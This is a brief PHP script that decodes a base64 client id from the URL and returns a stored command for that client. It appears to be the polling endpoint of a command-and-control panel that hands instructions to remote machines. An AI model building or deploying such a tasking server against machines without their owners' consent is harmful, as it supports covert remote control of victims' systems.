<?php 
include_once 'classes/Database.php';
include_once 'classes/Clients.php';
if (isset($_GET['id'])) {
	$client = new Clients;
	$command = $client->getCommand(base64_decode($_GET['id'])); 
	echo $command->command;
}
?>